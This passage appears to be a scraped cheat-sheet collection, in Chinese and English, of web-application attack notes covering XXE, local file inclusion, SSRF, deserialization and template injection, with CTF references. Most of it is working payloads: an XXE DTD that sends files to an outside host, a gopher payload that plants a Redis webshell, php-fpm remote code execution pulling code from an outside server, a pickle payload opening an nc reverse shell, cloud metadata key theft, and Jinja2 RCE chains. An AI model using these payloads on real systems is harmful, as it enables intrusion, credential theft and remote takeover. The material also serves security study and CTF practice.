&lt;root&gt;&amp;b;&lt;\/root&gt; xxe.dtd: &lt;!ENTITY b SYSTEM \"file:\/\/\/etc\/passwd\"&gt; Test XML php simplexml_load_string() apt install php7.3-xml $data = &lt;&lt;&lt;EOF &lt;!DOCTYPE wildfootw[ &lt;!ENTITY param &quot;hello world&quot;&gt; ]&gt; &lt;root&gt;&amp;param;&lt;\/root&gt; EOF; echo simplexml_load_string($data); Attacks Blind Error-based mohemiv Out of Band &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM \"php:\/\/filter\/convert.base64-encode\/resource=\/www\/index.php\"&gt; &lt;!ENTITY % remote SYSTEM \"http:\/\/wildfoo.tw\/xxe.dtd\"&gt; %remote; %all; %send; ]&gt; xxe.dtd: &lt;!ENTITY % all \"&lt;!ENTITY &amp;#37; send SYSTEM 'http:\/\/wildfoo.tw\/?x=%file;'&gt;\"&gt; XXE + SMBrelay to RCE medium &lt;!DOCTYPE kaibro[ &lt;!ENTITY xxe SYSTEM \"\\\\12.34.56.78\"&gt; ]&gt; &lt;root&gt;&amp;xxe;&lt;\/root&gt; Others DoS Billion Laugh Attack &lt;!DOCTYPE data [ &lt;!ENTITY a0 \"dos\" &gt; &lt;!ENTITY a1 \"&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;\"&gt; &lt;!ENTITY a2 \"&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;\"&gt; &lt;!ENTITY a3 \"&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;\"&gt; &lt;!ENTITY a4 \"&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;\"&gt; ]&gt; &lt;data&gt;&amp;a4;&lt;\/data&gt; \u4e32 Phar \u53cd\u5e8f\u5217\u5316 &lt;?xml version=\"1.0\" standalone=\"yes\"?&gt; &lt;!DOCTYPE ernw [ &lt;!ENTITY xxe SYSTEM \"phar:\/\/\/var\/www\/html\/images\/gginin\/xxxx.jpeg\" &gt; ]&gt; &lt;svg width=\"500px\" height=\"100px\" xmlns=\"http:\/\/www.w3.org\/2000\/svg\" xmlns:xlink=\"http:\/\/www.w3.org\/1999\/xlink\" version=\"1.1\"&gt; &lt;text font-family=\"Verdana\" font-size=\"16\" x=\"10\" y=\"40\"&gt;&amp;xxe;&lt;\/text&gt; &lt;\/svg&gt; Example: MidnightSun CTF - Rubenscube XXE in Files Black hat 2015 video file types DOCX XLSX PPTX PDF Tools OXML_XXE DOCEM","tags":"","url":"Web_Application_Attack\/XXE_(XML_External_Entity).html"},{"title":"FLI (Local File Inclusion)","text":"FLI (Local File Inclusion) Table of Contents FLI (Local File Inclusion) tags: Security Web \u5e38\u898b\u5834\u666f PHP Target Config \/proc\/* \u74b0\u5883\u8b8a\u6578 log file RCE Tricks Session \u53ef\u63a7 \u5b58\u5728 phpinfo log file \u53ef\u8b80 Payloads Linux \/ Unix Windows php:\/\/filter php:\/\/input data:\/\/ zip \/ phar Others SSI (Server Side Includes) tags: Security Web \u5e38\u898b\u5834\u666f PHP include() requir() include_once() require_once() Target Config \/etc\/apache2\/apache2.conf \/etc\/nginx\/nginx.conf \/etc\/apache2\/sites-available\/000-default.conf \/etc\/php\/php.ini \/proc\/* \/proc\/self\/cmdline \/\/ \u57f7\u2f8f\u6642\u7684 Command \/proc\/self\/exe \/\/ \u6488\u57f7\u2f8f\u6a94 (\u53ef\u4ee5\uf905 reverse\/pwn) \/proc\/self\/environ \/\/ \u74b0\u5883\u8b8a\u6578 \/proc\/self\/fd\/* \/\/ filedescriptor \u74b0\u5883\u8b8a\u6578 ..\/..\/..\/..\/proc\/self\/environ HTTP_User_Agent \u585e php script log file \u53ef\u914d\u5408 RCE Tricks access.log error.log apache log mysql log mail log ssh log \/var\/log\/auth.log RCE Tricks \u628a code \u50b3\u5230\u76ee\u6a19\u4e0a\u5f8c\uff0c\u518d\u9032\u884c LFI Session \u53ef\u63a7 \u5404\u500b\u7248\u672c\u7684 php \uff0c session \u5b58\u653e\u4f4d\u7f6e\u4e0d\u540c stackoverflow \u5e38\u898b\u5b58\u653e\u8def\u5f91 \/var\/lib\/php\/sessions\/sess_[session id] \/var\/lib\/php\/session\/sess_[session id] \/var\/lib\/php\/ \/var\/lib\/php5\/ \/var\/tmp\/ \/tmp\/ session.upload_progress PHP\u9810\u8a2d\u958b\u555f \u7528\u4f86\u76e3\u63a7\u4e0a\u50b3\u6a94\u6848\u9032\u5ea6 \u7576 session.upload_progress.enabled \u958b\u555f\uff0c\u53ef\u4ee5 POST \u5728 $_SESSION \u4e2d\u6dfb\u52a0\u8cc7\u6599 session.upload_progress.cleanup=on\u6642\uff0c\u53ef\u4ee5\u900f\u904e Race condition \u5b58\u5728 phpinfo \u53ef\u4ee5\u5728 phpinfo \u770b\u5230\u4e0a\u50b3\u66ab\u5b58\u6a94\u7684\u4f4d\u7f6e\uff0c\u5c0d server \u4ee5 form-data \u786c\u50b3\u6a94\u6848\uff0c\u6703\u7522\u751f tmp \u6a94 &amp; Race condition =&gt; LFI Get shell Ubuntu 17\u5f8c\uff0c\u9810\u8a2d\u958b\u555fPrivateTmp\uff0c\u7121\u6cd5\u5229\u7528 log file \u53ef\u8b80 \u5beb\u5728 User-Agent \/ URL Payloads GitHub: swisskyrepo\/PayloadsAllTheThings curl http:\/\/kioptrix3.com\/index.php\\?system\\=..\/..\/..\/..\/..\/etc\/passwd%00W Linux \/ Unix .\/index.php .\/.\/index.php .\/\/index.php ..\/..\/..\/..\/..\/..\/etc\/passwd ..\/..\/..\/..\/..\/..\/etc\/passwd%00 \u50c5\u57285.3.0\u4ee5\u4e0b\u53ef\u7528 magic_quotes_gpc\u9700\u70baOFF %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd \uff2e\uff2e\/\uff2e\uff2e\/\uff2e\uff2e\/etc\/passwd \/var\/log\/apache2\/error.log \/var\/log\/httpd\/access_log \/var\/log\/mail.log \/usr\/local\/apache2\/conf\/httpd.conf \/etc\/apache2\/apache2.conf \/etc\/apache2\/httpd.conf \/etc\/apache2\/sites-available\/000-default.conf \/usr\/local\/etc\/apache2\/httpd.conf \/etc\/nginx\/conf.d\/default.conf \/etc\/nginx\/nginx.conf \/etc\/nginx\/sites-enabled\/default \/etc\/nginx\/sites-enabled\/default.conf \/proc\/net\/fib_trie .htaccess \/root\/.bash_history \/root\/.ssh\/id_rsa \/root\/.ssh\/authorized_keys Windows C:\/Windows\/win.ini C:\/boot.ini C:\/apache\/logs\/access.log ..\/..\/..\/..\/..\/..\/..\/..\/..\/boot.ini\/....................... C:\/windows\/system32\/drivers\/etc\/hosts php:\/\/filter php:\/\/filter\/convert.base64-encode\/resource=index.php php:\/\/filter\/convert.base64-decode\/resource=index.php php:\/\/filter\/read=string.rot13\/resource=index.php php:\/\/filter\/zlib.deflate\/resource=index.php php:\/\/filter\/zlib.inflate\/resource=index.php php:\/\/filter\/convert.quoted-printable-encode\/resource=index.php php:\/\/filter\/read=string.strip_tags\/resource=php:\/\/input php:\/\/filter\/convert.iconv.UCS-2LE.UCS-2BE\/resource=index.php php:\/\/filter\/convert.iconv.UCS-4LE.UCS-4BE\/resource=index.php php:\/\/input ?page=php:\/\/input post data: &lt;?php system(&quot;net user&quot;); ?&gt; \u9700\u8981\u6709\u958b\u555furl_allow_include\uff0c5.4.0\u76f4\u63a5\u5ee2\u9664 data:\/\/ \u689d\u4ef6 allow_url_fopen: On allow_url_include: On \u7528\u6cd5 ?file=data:\/\/text\/plain,&lt;?php phpinfo()?&gt; ?file=data:text\/plain,&lt;?php phpinfo()?&gt; ?file=data:\/\/text\/plain;base64,PD9waHAgcGhwaW5mbygpPz4= zip \/ phar \u9069\u7528\u9a57\u8b49\u526f\u6a94\u540d\u6642 zip \u65b0\u5efazip\uff0c\u88e1\u982d\u58d3\u7e2ephp\u8173\u672c(\u53ef\u6539\u526f\u6a94\u540d) ?file=zip:\/\/myzip.zip#php.jpg phar &lt;?php $p = new PharData(dirname(__FILE__).'\/phartest.zip',0,'phartest2',Phar::ZIP); $x = file_get_contents('.\/a.php'); $p-&gt;addFromString('b.jpg', $x); ?&gt; \u69cb\u9020 ?file=phar:\/\/phartest.zip\/b.jpg Others SSI (Server Side Includes) \u901a\u5e38\u653e\u5728.shtml, .shtm Execute Command &lt;!--#exec cmd=&quot;command&quot;--&gt; File Include &lt;!--#include file=&quot;..\/..\/web.config&quot;--&gt; Example HITCON CTF 2018 - Why so Serials?","tags":"","url":"Web_Application_Attack\/FLI_(Local_File_Inclusion).html"},{"title":"SSRF (Server Side Request Forgery)","text":"SSRF (Server Side Request Forgery) Table of Contents SSRF (Server Side Request Forgery) tags: Security Web Reference Where \u5e38\u898b\u53c3\u6578\u540d\u7a31 Other XXE FFMPEG CVE-2016-1897\/98 Database \u5167\u5efa\u51fd\u6578 Postgresql dblink_send_query ImageMagick CVE-2016-3718 \u5224\u65b7\u65b9\u6cd5 HTTP Access Log DNS Log \u8fd4\u56de\u5167\u5bb9 Intranet IP Range Payloads Attacks XSPA \u672c\u5730\u5229\u7528 file protocol Java \u539f\u751f\u53ef\u5217\u76ee\u9304 Python Perl\/Ruby open Command Injection Libreoffice CVE-2018-6871 \u9060\u7a0b\u5229\u7528 Protocol \u5011\u7684\u4f7f\u7528\u65b9\u6cd5 Gopher Protocol dict Protocol sftp Protocol Struts2 s2-016 (HTTP) Struts2 s2-057 (HTTP) ElasticSearch CVE-2015-3337 (HTTP) Cloud Metadata (HTTP) Docker API (HTTP) Redis (REdis Serialization Protocol) php-fpm (FastCGI) MySQL (MySQL) Bypass DNS DNS Rebinding URL 127.0.0.1 IPv6 \u4e0d\u540c\u9032\u4f4d Unicode \u24b6 \u24b7 \u24b8 \u24b9 domain 302 Redirect Others CRLF injection SMTP FingerPrint UDP tags: Security Web \u5229\u7528\u80fd\u63a5\u89f8\u5230\u7684\u4f3a\u670d\u5668\uff0c\u63a5\u89f8\u5230\u5167\u7db2\u8cc7\u6e90 \u8ddf LFI \/ RFI \u7684\u5dee\u5225\u5728\u65bc SSRF \u662f\u767c\u51fa Request\uff0c LFI \/ RFI \u662f\u5305\u542b\u6587\u4ef6 Reference SSRF Bible Where \u5e38\u898b\u53c3\u6578\u540d\u7a31 url, link, proxy, target, host URL \u9810\u89bd\u3001\u5206\u4eab \u7db2\u5740\u4e0a\u50b3 \u8cc7\u6e90\u5f15\u7528 Other XXE \u5916\u90e8\u5be6\u9ad4\u3001\u53c3\u6578\u5be6\u9ad4 \u53c3\u8003 XXE (XML External Entity) FFMPEG CVE-2016-1897\/98 #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http:\/\/gg.tw\/a.m3u8|file:\/\/\/etc\/passwd #EXT-X-ENDLIST Database \u5167\u5efa\u51fd\u6578 Postgresql dblink_send_query ImageMagick CVE-2016-3718 \u53ef\u4ee5\u767c\u9001 HTTP \u6216 FTP Request payload: ssrf.mvg push graphic-context viewbox 0 0 640 480 fill 'url(http:\/\/example.com\/)' pop graphic-context $ convert ssrf.mvg out.png \u5224\u65b7\u65b9\u6cd5 HTTP Access Log \u770b\u81ea\u5df1\u7684\u4f3a\u670d\u5668\u662f\u5426\u6709\u6536\u5230 Request \u6709\u53ef\u80fd\u5c0d\u65b9\u7684\u9632\u706b\u7246\u6709\u6a94 http \u5c0d\u5916 DNS Log \u5927\u90e8\u5206\u7684\u9632\u706b\u7246\u4e0d\u6703\u6a94 DNS \u67e5\u8a62 \u8fd4\u56de\u5167\u5bb9 \u900f\u904e Banner, Title, Content \u7b49\u8cc7\u8a0a\u4f86\u8fa8\u8a8d Intranet IP Range 127.0.0.1\/8 10.0.0.0\/8 172.16.0.0\/12 192.168.0.0\/16 Payloads cujanovic SSRF-Testing Attacks XSPA port scan 127.0.0.1:80 =&gt; OK 127.0.0.1:87 =&gt; Timeout 127.0.0.1:9487 =&gt; Timeout \u672c\u5730\u5229\u7528 \u76ee\u6a19\u53ef\u4ee5\u53c3\u8003 LFI file protocol file:\/\/\/etc\/passwd file:\/\/localhost\/etc\/passwd curl file:\/\/google.com\/etc\/passwd \u65b0\u7248\u5df2\u4fee\u6389 \u5be6\u6e2clibcurl 7.47\u53efwork Java \u539f\u751f\u53ef\u5217\u76ee\u9304 file:\/\/\/var\/www\/html\/ netdoc:\/\/\/var\/www\/html\/ Python local_file:\/\/\/etc\/passwd Perl\/Ruby open Command Injection Libreoffice CVE-2018-6871 \u53ef\u4ee5\u4f7f\u7528WEBSERVICE\u8b80\u672c\u5730\u6a94\u6848\uff0ce.g.\/etc\/passwd \u8b80\u51fa\u4f86\u53ef\u4ee5\u7528http\u5f80\u5916\u50b3 =COM.MICROSOFT.WEBSERVICE(&amp;quot;http:\/\/kaibro.tw\/&amp;quot;&amp;amp;COM.MICROSOFT.WEBSERVICE(&amp;quot;\/etc\/passwd&amp;quot;)) e.g. DCTF 2018 final, FBCTF 2019 Example Payload: Link \u9060\u7a0b\u5229\u7528 \u5404\u500b\u8edf\u9ad4\u652f\u63f4\u7684 protocol \u5404\u500b protocol \u53ef\u4ee5\u6a21\u64ec\u7684 protocol Protocol \u5011\u7684\u4f7f\u7528\u65b9\u6cd5 Gopher Protocol \u6a21\u64ec\u5176\u4ed6 Protocol %0d%0a =&gt; \\r\\n Padding \u53ef\u4ee5\u662f\u4efb\u610f dict Protocol fingerprint \u5f80\u56de\u9001 Request \uff0c\u6703\u51fa\u73fe\u76ee\u6a19\u4e3b\u6a5f\u4f7f\u7528\u7684\u8edf\u9ad4\uff0cz.B.libcurl 7.54.0 dict:\/\/evil.com:5566 $ nc -vl 5566 Listening on [0.0.0.0] (family 0, port 5278) Connection from [x.x.x.x] port 5566 [tcp\/*] accepted (family 2, sport 40790) CLIENT libcurl 7.35.0 -&gt; libcurl version Redis sftp Protocol fingerprint sftp:\/\/evil.com:5566 $ nc -vl 5566 Listening on [0.0.0.0] (family 0, port 5278) Connection from [x.x.x.x] port 5278 [tcp\/*] accepted (family 2, sport 40810) SSH-2.0-libssh2_1.4.2 -&gt; ssh version Struts2 s2-016 (HTTP) action:\u3001redirect:\u3001redirectAction: http:\/\/10.0.2.87\/index.do?redirect:${new java.lang.ProcessBuilder('id').start()} Struts2 s2-057 (HTTP) http:\/\/10.0.2.87\/$%7B233*233%7D\/actionChain1.action ElasticSearch CVE-2015-3337 (HTTP) http:\/\/10.0.2.87:9200\/_plugin\/head\/..\/..\/..\/..\/etc\/passwd Cloud Metadata (HTTP) cloud_metadata.txt http:\/\/169.254.169.254\/latest\/meta-data\/public-keys\/[ID]\/openssh-key http:\/\/metadata.google.internal\/computeMetadata\/v1\/instance\/disks\/?recursive=true Docker API (HTTP) Remote api \u672a\u6388\u6b0a\u8a2a\u554f \u958b\u4e00\u500bcontainer\uff0c\u639b\u8f09\/root\/\uff0c\u5bebssh key \u5bebcrontab\u5f48shell Redis (REdis Serialization Protocol) default port: 6379 \u7528 SAVE \u5beb webshell FLUSHALL SET myshell &quot;&lt;?php system($_GET['cmd']) ?&gt;&quot; CONFIG SET DIR \/www CONFIG SET DBFILENAME shell.php SAVE QUIT gopher:\/\/127.0.0.1:6379\/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT \u7528 SAVE \u5beb SSH Key \u7528 SAVE \u5beb crontab php-fpm (FastCGI) default port: 9000 example Discuz Pwn 302.php: &lt;?php header( &quot;Location: gopher:\/\/127.0.0.1:9000\/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME\/www\/\/index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http:\/\/kaibro.tw\/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00&quot; ); x: &lt;?php system($_GET['cmd']); ?&gt; visit: \/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http:\/\/kaibro.tw\/302.php?.jpg[\/img] MySQL (MySQL) \u7121\u5bc6\u78bc\u8a8d\u8b49\u53ef\u4ee5SSRF MySQL Client\u8207Server\u4ea4\u4e92\u4e3b\u8981\u5206\u5169\u968e\u6bb5 Connection Phase Command Phase gopher:\/\/127.0.0.1:3306\/_&lt;PAYLOAD&gt; Tool: https:\/\/github.com\/undefinedd\/extract0r- Bypass DNS DNS Rebinding TTL \u8a2d\u5f88\u5c0f \u7b2c\u4e8c\u6b21\u89e3\u6790\u7684\u6642\u5019\u7d66\u4ed6\u5167\u7db2 ip if(validate_domain($domain)){ file_get_contents($domain); } A.54.87.54.87.1time.127.0.0.1.forever.rebind.network 36573657.7f000001.rbndr.us URL 127.0.0.1 127.0.0.1 localhost 127.0.1 127.1 0.0.0.0 0.0 0 IPv6 ::1 ::127.0.0.1 ::ffff:127.0.0.1 ::1%1 [::] ip6-localhost \u4e0d\u540c\u9032\u4f4d 2130706433 (decimal) 0x7f000001 017700000001 0x7f.0x0.0x0.0x1 0177.0.0.1 0177.01.01.01 0x7f.1 Unicode \u24b6 \u24b7 \u24b8 \u24b9 http:\/\/\u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc domain 127.0.0.1.xip.io foo.bar.10.0.0.1.xip.io 302 Redirect \u7528\u4f86\u7e5e\u904e Protocol \u9650\u5236 &lt;?php Header(\"Location: gopher:\/\/127.0.0.1:9000\/x...\"); Others CRLF injection SMTP SECCON 2017 SqlSRF: 127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckaibrotw%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25\/ FingerPrint Content-Length \u9001\u8d85\u5927Content-length \u9023\u7ddahang\u4f4f\u5224\u65b7\u662f\u5426\u70baHTTP Service UDP tftp tftp:\/\/evil.com:5566\/TEST syslog","tags":"","url":"Web_Application_Attack\/SSRF_(Server_Side_Request_Forgery).html"},{"title":"Deserialization Vulnerability","text":"Deserialization Vulnerability Table of Contents Deserialization Vulnerability tags: Security Web PHP deserialization PHP Phar deserialization Python Pickle Java deserialization ASP.NET deserialization Other PHP - Serialize() \/ Unserialize() Python Pickle Ruby\/Rails Marshal Ruby\/Rails YAML Java Deserialization .NET Derserialization tags: Security Web PHP deserialization PHP Phar deserialization Python Pickle Exploiting Python pickles (Mind RCE(object)) create_payload.py import pickle import base64 import os class RCE(object): def __reduce__(self): cmd = ('rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/sh -i 2&gt;&amp;1|nc 10.10.14.4 7777 &gt; \/tmp\/f') return os.system, (cmd,) def create_payload(): pickled = pickle.dumps(RCE()) payload = base64.urlsafe_b64encode(pickled) print(payload) Java deserialization ASP.NET deserialization Other PHP - Serialize() \/ Unserialize() __construct() Object\u88abnew\u6642\u8abf\u7528\uff0c\u4f46unserialize()\u4e0d\u8abf\u7528 __destruct() Object\u88ab\u92b7\u6bc0\u6642\u8abf\u7528 __wakeup() unserialize\u6642\u81ea\u52d5\u8abf\u7528 __sleep() \u88abserialize\u6642\u8abf\u7528 __toString() \u7269\u4ef6\u88ab\u7576\u6210\u5b57\u4e32\u6642\u8abf\u7528 Value String s:size:value; Integer i:value; Boolean b:value; (\u20181\u2019 or \u20180\u2019) NULL N; Array a:size:{key definition; value definition; (repeat per element)} Object O:strlen(class name):class name:object size:{s:strlen(property name):property name:property definition;(repeat per property)} \u5176\u4ed6 C - custom object R - pointer reference Public \/ Private \/ Protected \u5e8f\u5217\u5316 \u4f8b\u5982\uff1aclass\u540d\u5b57\u70ba: Kaibro\uff0c\u8b8a\u6578\u540d\u5b57: test \u82e5\u70baPublic\uff0c\u5e8f\u5217\u5316\u5f8c\uff1a ...{s:4:&quot;test&quot;;...} \u82e5\u70baPrivate\uff0c\u5e8f\u5217\u5316\u5f8c\uff1a ...{s:12:&quot;%00Kaibro%00test&quot;} \u82e5\u70baProtected\uff0c\u5e8f\u5217\u5316\u5f8c\uff1a ...{s:7:&quot;%00*%00test&quot;;...} Private\u548cProtected\u6703\u591a\u5169\u500bNULL byte Example &lt;?php class Kaibro { public $test = \"ggininder\"; function __wakeup() { system(\"echo \".$this-&gt;test); } } $input = $_GET['str']; $kb = unserialize($input); Input: .php?str=O:6:&quot;Kaibro&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;;id&quot;;} Output: uid=33(www-data) gid=33(www-data) groups=33(www-data) Example 2 - Private &lt;?php class Kaibro { private $test = \"ggininder\"; function __wakeup() { system(\"echo \".$this-&gt;test); } } $input = $_GET['str']; $kb = unserialize($input); Input: .php?str=O:6:&quot;Kaibro&quot;:1:{s:12:&quot;%00Kaibro%00test&quot;;s:3:&quot;;id&quot;;} Output: uid=33(www-data) gid=33(www-data) groups=33(www-data) CVE-2016-7124 \u5f71\u97ff\u7248\u672c\uff1a PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 \u7269\u4ef6\u5c6c\u6027\u500b\u6578\u5927\u65bc\u771f\u6b63\u7684\u5c6c\u6027\u500b\u6578\uff0c\u6703\u7565\u904e__wakeup\u7684\u57f7\u884c \u53cd\u5e8f\u5217\u5316\u6703\u5931\u6557\uff0c\u4f46\u662f__destruct\u6703\u57f7\u884c HITCON 2016 \u5c0f\u7279\u6027 O:+4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;} O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;} \u5169\u8005\u7d50\u679c\u76f8\u540c Phar:\/\/ \u53cd\u5e8f\u5217\u5316 phar\u6587\u4ef6\u6703\u5c07\u4f7f\u7528\u8005\u81ea\u5b9a\u7fa9\u7684metadata\u4ee5\u5e8f\u5217\u5316\u5f62\u5f0f\u4fdd\u5b58 \u900f\u904ephar:\/\/\u507d\u5354\u8b70\u53ef\u4ee5\u9054\u5230\u53cd\u5e8f\u5217\u5316\u7684\u6548\u679c \u5e38\u898b\u5f71\u97ff\u51fd\u6578: file_get_contents(), file_exists(), is_dir(), \u2026 Generic Gadget Chains phpggc Example HITCON CTF 2017 - Baby^H Master PHP 2017 HITCON CTF 2018 - Baby Cake DCTF 2018 - Vulture Python Pickle dumps() \u5c07\u7269\u4ef6\u5e8f\u5217\u5316\u6210\u5b57\u4e32 loads() \u5c07\u5b57\u4e32\u53cd\u5e8f\u5217\u5316 Example: a.py: import os import cPickle import sys import base64 class Exploit(object): def __reduce__(self): return (os.system, ('id',)) shellcode = cPickle.dumps(Exploit()) print base64.b64encode(shellcode) b.py: import os import cPickle import sys import base64 s = raw_input(\":\") print cPickle.loads(base64.b64decode(s)) $ python a.py &gt; tmp $ cat tmp | python b.py uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd) Ruby\/Rails Marshal this one is not self-executing this one actually relies on rails invoking a method on the resulting object after the deserialization erb = ERB.allocate erb.instance_variable_set :@src, \"`id`\" depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result, \"foo\", ActiveSupport::Deprecation hash = {depr =&gt; 'something'} marshalled = Marshal.dump(hash) print marshalled \u5728ERB\u4e0a\uff0c\u7576result\u6216run method\u88abcall\u6642\uff0c@src\u7684string\u6703\u88ab\u57f7\u884c \u5e38\u898b\u4f7f\u7528\u60c5\u5883\uff1a \u4ee5Marshal\u70baCookie Serializer\u6642\uff0c\u82e5\u6709secret_key\uff0c\u5247\u53ef\u4ee5\u507d\u9020Cookie \u4e5f\u53ef\u4ee5\u900f\u904eDeprecatedInstanceVariableProxy\u53bb\u57f7\u884cERB\u7684result\u4f86RCE \u7576DeprecatedInstanceVariableProxy\u88abunmarshal\uff0crails session\u5c0d\u4ed6\u8655\u7406\u6642\u9047\u5230\u4e0d\u8a8d\u8b58\u7684method\u5c31\u6703\u547c\u53ebmethod_missing\uff0c\u5c0e\u81f4\u57f7\u884c\u50b3\u5165\u7684ERB @instance.__send__(@method) Cookie Serializer Rails 4.1\u4ee5\u524d\u7684Cookie Serializer\u70baMarshal Rails 4.1\u958b\u59cb\uff0c\u9ed8\u8a8d\u4f7f\u7528JSON Ruby\/Rails YAML CVE-2013-0156 \u820a\u7248\u672c\u7684Rails\u4e2d\uff0cXML\u7684node\u53ef\u4ee5\u81ea\u8a02type\uff0c\u5982\u679c\u6307\u5b9a\u70bayaml\uff0c\u662f\u6703\u88ab\u6210\u529f\u89e3\u6790\u7684 \u82e5\u53cd\u5e8f\u5217\u5316!ruby\/hash\uff0c\u5247\u76f8\u7576\u65bc\u5728\u7269\u4ef6\u4e0a\u8abf\u7528obj[key]=val\uff0c\u4e5f\u5c31\u662f[]=\u65b9\u6cd5 \u800c\u9019\u500bActionDispatch::Routing::RouteSet::NamedRouteCollection\u4e2d\u7684[]=\u65b9\u6cd5\u4e2d\uff0c\u6709\u4e00\u689d\u4ee3\u78bc\u8def\u5f91\u53ef\u4ee5eval define_hash_access\u4e2d\u53ef\u4ee5\u770b\u5230module_eval\uff0c\u88cf\u982d\u7684selector\u4f86\u81eaname \u56e0\u70ba\u4ed6\u9084\u6703\u5c0dvalue\u8abf\u7528defaults method\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528OpenStruct\u4f86\u69cb\u9020 \u51fd\u6578\u540d=&gt;\u8fd4\u56de\u503c\u7684\u5c0d\u61c9\u95dc\u4fc2\u5b58\u653e\u5728@table\u4e2d Payload: xml = %{ &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;bingo type='yaml'&gt; ---| !ruby\/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection 'test; sleep(10); test' : !ruby\/object:OpenStruct table: :defaults: {} &lt;\/bingo&gt; }.strip CVE-2013-0333 Rails 2.3.x\u548c3.0.x\u4e2d\uff0c\u5141\u8a31text\/json\u7684request\u8f49\u6210YAML\u89e3\u6790 Yaml\u5728Rails 3.0.x\u662f\u9810\u8a2d\u7684JSON Backend \u51fa\u554f\u984c\u7684\u5730\u65b9\u5728\u65bcYAML.load\u524d\u7684convert_json_to_yaml\uff0c\u4ed6\u4e0d\u6703\u6aa2\u67e5\u8f38\u5165\u7684JSON\u662f\u5426\u5408\u6cd5 \u4e00\u6a23\u53ef\u4ee5\u900f\u904eActionController::Routing::RouteSet::NamedRouteCollection#define_hash_access\u7684module_eval\u4f86RCE Java Deserialization https:\/\/github.com\/GrrrDog\/Java-Deserialization-Cheat-Sheet .NET Derserialization ysoserial.net asp.net\u4e2dViewState\u4ee5\u5e8f\u5217\u5316\u5f62\u5f0f\u4fdd\u5b58\u8cc7\u6599 \u6709machinekey\u6216viewstate\u672a\u52a0\u5bc6\/\u9a57\u8b49\u6642\uff0c\u53ef\u4ee5RCE Example HITCON CTF 2018 - Why so Serials?","tags":"","url":"Web_Application_Attack\/Deserialization_Vulnerability.html"},{"title":"SSTI (Server Side Template Injection)","text":"SSTI (Server Side Template Injection) Table of Contents SSTI (Server Side Template Injection) tags: Security Web \u5224\u65b7\u4f7f\u7528\u7684 Template Templates Jinja2 (Python) Other Testing Flask\/Jinja2 AngularJS Vue.js Python Tool tags: Security Web \u5224\u65b7\u4f7f\u7528\u7684 Template Templates Jinja2 (Python) Other Testing {{ 7*'7' }} Twig: 49 Jinja2: 7777777 &lt;%= 7*7 %&gt; Ruby ERB: 49 Flask\/Jinja2 Dump all used classes {{ ''.__class__.__mro__[2].__subclasses__() }} Read File {{''.__class__.__mro__[2].__subclasses__()[40]('\/etc\/passwd').read()}} Write File {{''.__class__.__mro__[2].__subclasses__()[40]('\/var\/www\/app\/a.txt', 'w').write('Kaibro Yo!')}} RCE {{ ''.__class__.__mro__[2].__subclasses__()[40]('\/tmp\/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }} evil config {{ config.from_pyfile('\/tmp\/evilconfig.cfg') }} load config {{ config['RUNCMD']('cat flag',shell=True) }} RCE (another way) {{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}} Python3 RCE {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} \u904e\u6ffe\u4e2d\u62ec\u865f __getitem__ {{''.__class__.__mro__.__getitem__(2)}} {{''.__class__.__mro__[2]}} \u904e\u6ffe{{ or }} \u7528{%%} \u57f7\u884c\u7d50\u679c\u5f80\u5916\u50b3 \u904e\u6ffe. {{''.__class__}} {{''['__class__']}} {{''|attr('__class__')}} \u904e\u6ffeKeyword \u7528\\xff\u5f62\u5f0f\u53bb\u7e5e {{''[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;]}} \u7528request\u7e5e {{''.__class__}} 